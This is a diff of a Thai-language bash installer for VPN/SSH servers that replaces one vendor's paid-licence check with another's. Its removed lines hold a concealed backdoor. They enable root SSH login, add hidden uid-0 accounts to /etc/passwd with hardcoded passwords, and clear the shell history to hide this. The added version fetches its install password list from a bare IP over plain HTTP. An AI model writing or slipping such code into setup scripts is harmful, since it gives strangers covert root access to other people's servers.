@@ -1,81 +1,89 @@
 #!/bin/bash
 
-# Check Root
-if [[ "$USER" != 'root' ]]; then
-	echo "
-----------------------------------------------
-
-[√] คุณต้องพิมพ์คำสั่ง sudo su เพื่อใช้งานเป็น root
-
-----------------------------------------------
-"
+if [ $USER != 'root' ]; then
+	echo "Sorry, for run the script please using root user"
 	exit
 fi
 
-# Requirement
-if [ ! -e /usr/bin/curl ]; then
-    apt-get -y update && apt-get -y upgrade
-	apt-get -y install curl
-fi
-
-# Root Login
-sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
-service ssh restart
-
-# Add User
-useradd byvpn
-useradd R00T
-sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
-sed -i '$ i\byvpn.net:x:0:0:byvpn.net:/root:/bin/bash' /etc/passwd
-echo -e "2499\n2499" | passwd byvpn
-echo -e "2499\n2499" | passwd R00T
-echo -e "Potae24-99\nPotae24-99" | passwd admin
-echo -e "Potae24-99\nPotae24-99" | passwd byvpn.net
-clear
-history -c
-
-# Initialisasi Var
+# check OS
 export DEBIAN_FRONTEND=noninteractive
 OS=`uname -m`;
-
-# Get IP
-MYIP=$(curl -4 icanhazip.com)
-if [ $MYIP = "" ]; then
-   MYIP=`ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1`;
+MYIP=$(wget -qO- ipv4.icanhazip.com);
+MYIP2="s/xxxxxxxxx/$MYIP/g";
+ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
+if [[ $ether = "" ]]; then
+        ether=eth0
 fi
 
-# Set
-MYIP2="s/IP-Server/$MYIP/g";
-CheckIP="https://dl.dropboxusercontent.com/s/9oqskrucmho3cu9/IP.txt"
-Source="https://raw.githubusercontent.com/byvpn/Info/master/"
-
-# Check Registered IP
-wget -q -O /usr/bin/IP $CheckIP
-if ! grep -w -q $MYIP /usr/bin/IP; then
-  clear
-  echo "
-----------------------------------------------
-[√] ขออภัย IP Server ของคุณยังไม่ได้ลงทะเบียนกับ BYVPN.NET
-
-[√] เฉพาะ IP Server ที่จดทะเบียนแล้วสามารถใช้สคริปต์นี้ได้เท่านั่น
-
-[√] ราคา 1 IP = 100 บาท ใช้งานได้ทุกระบบ
-
-[√] หากต้องการใช้งานสคริปโปรดติดต่อลงทะเบียนได้ที่
-
-[√] เฟชบุ๊ค : https://www.facebook.com/tae.taruma
-
-[√] แฟนเพจ : https://www.facebook.com/byvpn.net
-----------------------------------------------
-"
-	rm /usr/bin/IP
-	rm -f /usr/bin/IP
-	rm /root/install
-	rm -f /root/install
-  history -c
-	exit
-
+myip=$(ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1)
+if [ "$MYIP" = "" ]; then
+	myip=$(wget -qO- ipv4.icanhazip.com)
 fi
+MYIP=$(ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1)
+if [ "$MYIP" = "" ]; then
+	MYIP=$(wget -qO- ipv4.icanhazip.com)
+fi
+MYIP2="s/xxxxxxxxx/$MYIP/g";
+ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
+if [[ $ether = "" ]]; then
+        ether=eth0
+fi
+
+#source file
+	source="https://goo.gl/yTmQPm"
+
+# go to root
+cd
+
+#password
+clear
+ echo ""
+          echo -e "\e[031;1m     
+                         
+                =============== OS-32 & 64-bit ================
+                ♦                                             ♦
+                ♦     AUTOSCRIPT CREATED BY เฮียเบิร์ด แงะตลอด   ♦
+                ♦       -----------About Us------------       ♦ 
+                ♦            Telp : 097-026-7262              ♦
+                ♦         { VPN / SSH / OCS PANEL }           ♦ 
+                ♦       http://facebook.com/Ceolnw            ♦    
+                ♦             Line id : ceolnw                ♦
+                ♦                                             ♦
+                =============== OS-32 & 64-bit ================
+                
+                    >>>>> โปรดชำระเงินก่อนใช้สคริปต์อัตโนมัติ <<<<<
+                  ..........................................
+                  .         ราคา: 50 บาท = 1IP             .
+                  .        ***********************         .
+                  .        True Wallet Account             .
+                  .        =======================         .
+                  .        Phone : 097-026-7262            .
+                  .        Name  : HERE BIRD LNWSHOP       .
+                  ..........................................   
+                                      
+                           Thank You For Choice Us"
+			
+	echo ""
+	echo -e "\e[034;1m----SCRIPT V.1 FREE"
+	echo ""
+	echo -e "\e[032;1m ( ใส่รหัสผ่านติดตั้ง... )"
+	echo ""
+read -p "๏๏๏โปรดใส่รหัสสำหรับติดตั้งสคลิปนี้.. : " passwds
+wget -q -O /usr/bin/pass http://27.254.81.20/~com/pass.txt
+if ! grep -w -q $passwds /usr/bin/pass; then
+clear
+echo ""
+echo ""
+echo " เสียใจด้วย รหัสผิดว่ะ ถ้าไม่มีรหัสติดต่อแอดมินฯ เฮียเบิร์ด"
+echo ""
+echo " เด้งไปเลยเฟสนี้แน่นอน : www.facebook.com/ceonw"
+echo ""
+echo ""
+rm /usr/bin/pass
+rm x.sh
+exit
+fi
+
 clear
 echo "
 ----------------------------------------------
